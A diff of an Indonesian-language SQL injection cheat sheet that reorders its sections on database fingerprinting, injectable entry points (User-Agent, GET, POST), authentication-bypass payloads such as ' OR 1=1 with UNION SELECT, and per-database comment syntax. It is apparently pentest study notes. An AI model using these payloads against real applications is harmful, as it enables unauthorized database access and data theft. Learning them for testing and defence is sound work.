@@ -11,17 +11,34 @@
 
 ## langkah-langkah
 1. Identifikasi DB apa yang digunakan, salah satu caranya adalah dengan generate error sehaingga server menampilka informasi teknologi. Walaupun server tidak mereturkan error, tapi server selau mereturn databse yang digunakan ketika kita menijectkan payload finding db version.
-    |DB|Function (non-blind)|Function (blind)->string concatenation|Function (blind)->all function return an INTEGER NUMBER in the respective database while generate ERROR on all others|
-    |---|---|---|---|
-    |MySQL|@@version<br>@@global.version<br>version()|'Concat' 'enation'<br>CONCAT('Concat','enation')|CONNECTION_ID()<br>LAST_INSERT_ID()<br>ROW_COUNT()<br>...|
-    |MS SQL| @@version|'some'+'enation'<br>CONCAT('Concat','enation')|@@PACK_RECEIVED<br>@@ROW_COUNT<br>@@TRANCOUNT<br>...|
-    |Oracle|version FROM v$instance<br>banner FROM v$version WHERE banner LIKE 'oracle%'<br>banner FROM gv$version WHERE banner LIKE 'oracle%'|'Concat'\|\|'enation'<br>CONCAT('Concat','enation')|BITAND(0,1)<br>BIN_TO_NUMB(1)<br>TO_NUMBER(1231)<br>...
 2. Identify kapan dan dimana aplikasi akan berinteraksi dengan DB Server untuk mengakses data. Berikut kondisi umum aplikasi berinteraksi dengan DB server.
     - Authentication form, user dan password akan dicek pada database apakah ada atau tidak (kadang juga hash)
     - Search Engine, string yang disubmit oleh user digunakan untuk mengeksract semua data yang relevant pada database
     - E-commerce site, semua produk e-commerce stored di DB
 2. List entry point/parameter yang bisa digunakan untuk menginputkan SQL query, seperti (__GET parameter, POST parameter, HTTP header, cookies__)
 3. Coba generate error pada entry point/parameter yang sudah dikumpulkan pada langkah sebelumnya menggunakan `'` (digunakan untuk memisahkan string) dan `;` (digunakan untuk mengakhiri kueri SQL)
+4. Coba meng-injek payload tanpa break query, bisa mengguna comment
+
+
+## Celah Injection
+- Header
+    - User-agent 
+- Parameter GET
+- Parameter POST
+
+## Payload
+|Payload|Payload alternatif|
+|---|---|
+|Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`|
+|UNION|`UNION SELECT`<br>`'UNION ALL SELECT`|
+
+|Database|Comment|
+|---|---|
+|Oracle|`--comment`|
+|MySQL|`-- comment` `-- -comment` `; -- -comment` `#comment` `/*comment*/`(also obfuscator) `;%00`(nullbyte) `+--+/`|
+|PostgreSQL|`--comment` `/*comment*/`|
+|Microsoft|`--comment` `/*comment*/`|
+
   ```
   <spasi_kosong>
   '
@@ -32,34 +49,13 @@
   `)
   `))
   ```
-4. Coba meng-injek payload tanpa break query, bisa mengguna comment
-
-|Database|Comment|
-|---|---|
-|Oracle|`--comment`|
-|MySQL|`-- comment` `-- -comment` `; -- -comment` `#comment` `/*comment*/`(also obfuscator) `;%00`(nullbyte) `+--+/`|
-|PostgreSQL|`--comment` `/*comment*/`|
-|Microsoft|`--comment` `/*comment*/`|
-
-## Payload
-```
-'or'1'='1
-' OR 1=1--
-' AND 1=1--
-```
-
-## Celah Injection
-- Header
-    - User-agent 
-- Parameter GET
-- Parameter POST
-
-## Bypass
-|Payload|Payload alternatif|
-|---|---|
-|Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`|
-|UNION|`UNION SELECT`<br>`'UNION ALL SELECT`|
-
+  
+|DB|Function (non-blind)|Function (blind)->string concatenation|Function (blind)->all function return an INTEGER NUMBER in the respective database while generate ERROR on all others|
+|---|---|---|---|
+|MySQL|@@version<br>@@global.version<br>version()|'Concat' 'enation'<br>CONCAT('Concat','enation')|CONNECTION_ID()<br>LAST_INSERT_ID()<br>ROW_COUNT()<br>...|
+|MS SQL| @@version|'some'+'enation'<br>CONCAT('Concat','enation')|@@PACK_RECEIVED<br>@@ROW_COUNT<br>@@TRANCOUNT<br>...|
+|Oracle|version FROM v$instance<br>banner FROM v$version WHERE banner LIKE 'oracle%'<br>banner FROM gv$version WHERE banner LIKE 'oracle%'|'Concat'\|\|'enation'<br>CONCAT('Concat','enation')|BITAND(0,1)<br>BIN_TO_NUMB(1)<br>TO_NUMBER(1231)<br>...|
+    
 ## Writeups
 |Title|Description|
 |---|---|
